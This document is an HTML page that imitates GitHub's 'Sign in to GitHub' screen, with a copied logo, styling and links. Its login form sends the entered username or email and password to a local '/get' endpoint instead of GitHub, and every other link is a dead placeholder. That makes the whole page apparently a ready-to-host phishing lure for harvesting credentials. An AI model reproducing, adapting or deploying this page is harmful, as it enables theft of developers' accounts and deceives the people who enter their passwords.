<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>Sign in to GitHub</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0d1117;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .logo {
            margin-bottom: 28px;
        }

        .logo svg {
            width: 56px;
            height: 56px;
            fill: #fff;
        }

        .title {
            font-size: 28px;
            font-weight: 300;
            color: #fff;
            text-align: center;
            margin-bottom: 28px;
        }

        .card {
            background: transparent;
            padding: 24px;
            width: 100%;
            max-width: 360px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .label-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }

        .label {
            font-size: 15px;
            font-weight: 600;
            color: #f0f6fc;
        }

        .forgot-link {
            font-size: 13px;
            color: #4493f8;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .input {
            width: 100%;
            height: 44px;
            padding: 8px 14px;
            border: 1px solid #30363d;
            border-radius: 6px;
            font-size: 16px;
            color: #f0f6fc;
            background: #0d1117;
            outline: none;
        }

        .input:focus {
            border-color: #1f6feb;
            box-shadow: 0 0 0 3px rgba(31, 111, 235, 0.3);
        }

        .submit-btn {
            width: 100%;
            height: 44px;
            background: #238636;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
        }

        .submit-btn:hover {
            background: #2ea043;
        }

        .links-card {
            background: transparent;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 20px 24px;
            width: 100%;
            max-width: 360px;
            margin-top: 20px;
            text-align: center;
        }

        .links-card p {
            font-size: 15px;
            color: #f0f6fc;
            margin-bottom: 10px;
        }

        .links-card a {
            color: #4493f8;
            text-decoration: none;
        }

        .links-card a:hover {
            text-decoration: underline;
        }

        .passkey-link {
            display: block;
            margin-top: 14px;
            font-size: 15px;
            color: #4493f8;
            text-decoration: none;
        }

        .passkey-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
<div class="logo">
    <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
        <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
    </svg>
</div>

<h1 class="title">Sign in to GitHub</h1>

<div class="card">
    <form action="/get" id="email-form-step">
        <div class="form-group">
            <label class="label">Username or email address</label>
            <input type="text" name="email" class="input" required>
        </div>

        <div class="form-group">
            <div class="label-row">
                <label class="label">Password</label>
                <a href="#" class="forgot-link">Forgot password?</a>
            </div>
            <input type="password" name="password" class="input" required>
        </div>

        <button type="submit" class="submit-btn">Sign in</button>
    </form>
</div>

<div class="links-card">
    <p>New to GitHub? <a href="#">Create an account</a></p>
    <a href="#" class="passkey-link">Sign in with a passkey</a>
</div>
</body>
</html>
